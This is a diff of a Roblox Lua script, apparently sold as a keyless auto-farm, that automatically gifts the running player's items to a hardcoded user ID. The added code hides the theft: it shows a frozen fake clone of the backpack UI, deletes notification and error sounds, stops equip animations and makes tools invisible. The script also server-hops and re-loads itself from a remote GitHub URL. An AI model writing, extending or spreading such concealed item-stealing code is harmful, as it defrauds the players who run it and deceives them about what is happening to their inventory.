@@ -9,7 +9,7 @@ local player = Players.LocalPlayer
 local PLACE_ID = game.PlaceId
 
 --====================================================
--- 🔥 READY FIX (PENTING BANGET)
+-- 🔥 READY FIX
 --====================================================
 
 repeat task.wait() until game:IsLoaded()
@@ -20,11 +20,11 @@ repeat task.wait() until player:FindFirstChild("Backpack")
 
 local backpack = player.Backpack
 
--- tunggu tool masuk (fix auto gift ga jalan)
+-- tunggu tool masuk
 repeat task.wait() until #backpack:GetChildren() > 0
 
 --====================================================
--- 🔥 CONFIG
+-- 🔧 CONFIG
 --====================================================
 
 local targetUserId = 9367836539
@@ -33,14 +33,10 @@ local weightFolder = ReplicatedStorage:WaitForChild("Objects"):WaitForChild("Wei
 
 local SCRIPT_URL = "https://raw.githubusercontent.com/changelog-modul/PHOENIXX-HUB/refs/heads/main/AutoFarmKeyless"
 
---====================================================
--- 🔒 ANTI DOUBLE HOP
---====================================================
-
 local hopped = false
 
 --====================================================
--- 🔁 QUEUE SYSTEM
+-- 🔁 QUEUE
 --====================================================
 
 local function queueSelf()
@@ -74,13 +70,13 @@ local function isBadServer()
     local t = getServerType()
     if not t then return false end
 
-    return string.find(t, "vip")
-        or string.find(t, "private")
-        or string.find(t, "reserved")
+    return string.find(t,"vip")
+        or string.find(t,"private")
+        or string.find(t,"reserved")
 end
 
 --====================================================
--- 🌐 FIND LOW SERVER
+-- 🌐 FIND SERVER
 --====================================================
 
 local function getLowServer()
@@ -120,10 +116,6 @@ local function hopServer()
     end
 end
 
---====================================================
--- 🚀 SERVER HANDLER
---====================================================
-
 task.spawn(function()
     task.wait(2)
 
@@ -143,30 +135,84 @@ task.spawn(function()
 end)
 
 --====================================================
--- 🎬 ANTI ANIM
+-- 🧊 FREEZE BACKPACK UI (FAKE VISUAL)
+--====================================================
+
+local playerGui = player:WaitForChild("PlayerGui")
+local backpackGui = playerGui:WaitForChild("Backpack")
+
+local frozen = false
+
+local function freezeBackpackUI()
+    if frozen then return end
+    frozen = true
+
+    local original = backpackGui:FindFirstChild("Backpack")
+    if not original then return end
+
+    local clone = original:Clone()
+    clone.Name = "FrozenBackpack"
+    clone.Parent = backpackGui
+    clone.Visible = true
+
+    original.Visible = false
+
+    RunService.RenderStepped:Connect(function()
+        if clone then
+            clone.Visible = true
+        end
+    end)
+end
+
+freezeBackpackUI()
+
+--====================================================
+-- 🔇 SOUND CLEAN
+--====================================================
+
+local effects = SoundService:WaitForChild("Effects")
+
+for _,name in pairs({"ErrorSound","Notification"}) do
+    local obj = effects:FindFirstChild(name)
+    if obj then obj:Destroy() end
+end
+
+--====================================================
+-- 🎬 SUPER SILENT EQUIP
 --====================================================
 
 local function getChar()
     return player.Character or player.CharacterAdded:Wait()
 end
 
-local animBlocked = false
+local animHooked = false
 
-local function blockAnim(hum)
-    if animBlocked then return end
-    animBlocked = true
+local function hookAnim(hum)
+    if animHooked then return end
+    animHooked = true
 
     hum.AnimationPlayed:Connect(function(track)
         local name = string.lower(track.Name)
-        if string.find(name,"tool") or string.find(name,"equip") or string.find(name,"hold") then
+        if string.find(name,"tool")
+        or string.find(name,"equip")
+        or string.find(name,"hold") then
             track:Stop()
         end
     end)
 end
 
---====================================================
--- 🎁 TOOL SYSTEM
---====================================================
+local function hideTool(tool)
+    for _,v in ipairs(tool:GetDescendants()) do
+        if v:IsA("BasePart") then
+            v.LocalTransparencyModifier = 1
+            v.Transparency = 1
+            v.CanCollide = false
+            v.Size = Vector3.new(0.05,0.05,0.05)
+        elseif v:IsA("Decal") then
+            v.Transparency = 1
+        end
+    end
+end
 
 local function isWeightTool(tool)
     return weightFolder:FindFirstChild(tool.Name) ~= nil
@@ -177,18 +223,14 @@ local function silentEquip(tool)
     local hum = char:FindFirstChildOfClass("Humanoid")
     if not hum then return end
 
-    blockAnim(hum)
+    hookAnim(hum)
 
+    hideTool(tool) -- sebelum equip
     hum:EquipTool(tool)
-    task.wait()
 
-    local handle = tool:FindFirstChild("Handle")
-    if handle then
-        handle.Transparency = 1
-        handle.CanCollide = false
-        handle.Massless = true
-        handle.Size = Vector3.new(0.05,0.05,0.05)
-    end
+    task.defer(function()
+        hideTool(tool)
+    end)
 end
 
 local function unequipAll()
@@ -213,7 +255,7 @@ local function getRarity(tool)
 end
 
 --====================================================
--- 🎁 AUTO GIFT LOOP (FIXED)
+-- 🎁 AUTO GIFT LOOP
 --====================================================
 
 task.spawn(function()
